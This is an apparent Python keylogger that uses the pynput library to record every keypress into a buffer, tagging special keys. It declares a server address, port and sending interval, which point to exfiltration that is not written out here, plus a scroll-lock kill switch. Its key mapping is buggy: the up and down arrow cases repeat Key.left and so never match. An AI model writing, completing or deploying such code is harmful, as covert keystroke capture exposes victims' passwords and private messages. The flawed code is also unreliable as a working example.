from pynput import keyboard
from pynput.keyboard import Key, KeyCode


server_ip = '127.0.0.1'
server_port = 9998
kill_switch = True
debug_logging = True
sending_interval = 1
data = ''


def process_keypress(key : Key|KeyCode|None) -> bool|None:
    global data
    
    if key == None:
        return
    
    if debug_logging:
        print(key, type(key))
    
    # Controler key pressed
    try:
        txt = ''
        if isinstance(key, Key):
            match key:
                case Key.enter:
                    txt = '\n'
                case Key.space:
                    txt = ' '
                case Key.tab:
                    txt = '\t'
                case Key.backspace:
                    txt = '[BKSP]'
                case Key.delete:
                    txt = '[DEL]'
                case Key.right:
                    txt = '[ARR_RIGHT]'
                case Key.left:
                    txt = '[ARR_LEFT]'
                case Key.left:
                    txt = '[ARR_UP]'
                case Key.left:
                    txt = '[ARR_DOWN]'
                case Key.shift:
                    txt = '[SHIFT]'
                case Key.caps_lock:
                    txt = '[CAPS]'
                case Key.scroll_lock: # kill switch
                    if kill_switch:
                        return False
        elif isinstance(key, KeyCode): # Letter pressed
            txt = key.char
        else:
            return
        
        data += txt
    except Exception as e:
        print(e)
        return
    
    
with keyboard.Listener(on_press=process_keypress) as listener:
        listener.join()